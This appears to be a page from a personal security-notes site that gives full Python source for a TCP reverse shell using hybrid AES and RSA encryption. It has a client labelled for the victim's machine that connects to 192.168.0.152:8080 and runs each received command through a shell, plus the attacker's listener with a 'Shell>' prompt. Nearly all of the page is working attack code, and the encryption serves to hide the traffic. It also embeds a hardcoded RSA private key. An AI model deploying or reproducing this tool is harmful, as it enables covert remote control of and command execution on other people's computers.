---
title: TCP reverse shell with hybrid encryption AES + RSA
author: amandaguglieri
draft: false
TableOfContents: true
---


# TCP reverse shell with hybrid encryption AES + RSA



## Client side

To be run on the victim's machine.

```python
import subprocess
import socket
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"H" * 16

def GET_AES(cipher):
    privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
    private_key = RSA.importKey(privatekey)
    decryptor = PKCS1_OAEP.new(private_key)
    return decryptor.decrypt(cipher).decode()


def encrypt(message):
    encryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(AES_KEY, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,
                                      16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.connect(('192.168.0.152', 8080))
    global AES_KEY
    AES_KEY = s.recv(1024)
    AES_KEY = GET_AES(AES_KEY)
    AES_KEY = AES_KEY.encode()
    print(AES_KEY)
    
    while True:
        command = s.recv(1024)
        
        command = decrypt(command).decode()
        print (command)
        if 'terminte' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            result = CMD.stdout.read()
            s.send(encrypt(result))
connect()

```


## Server side

```python
import socket
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import string
import random

IV = b"H" * 16


key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 32))


def SEND_AES(message):
    publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6
aP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA
kwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82
h/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ
pvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su
BZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y
gKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq
KTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7
U928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC
0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe
X2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx
7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==
-----END PUBLIC KEY-----'''
    public_key = RSA.importKey(publickey)
    encryptor = PKCS1_OAEP.new(public_key)
    encryptedData = encryptor.encrypt(message)
    return encryptedData




def encrypt(message):
    encryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key.encode(), AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message,
                                      16)
    return decrypted_message


def connect():
    s = socket.socket()
    s.bind(('192.168.0.152', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    
    conn, addr = s.accept()
    print(key.encode())
    conn.send(SEND_AES(key.encode()))

    while True:
        store = ''
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        else:
            command = encrypt(command.encode())
            conn.send(command)
            result = conn.recv(1024)
            try:
                print(decrypt(result).decode())
            except:
                print("[-] unable to decrypt/receive data!")

connect()

```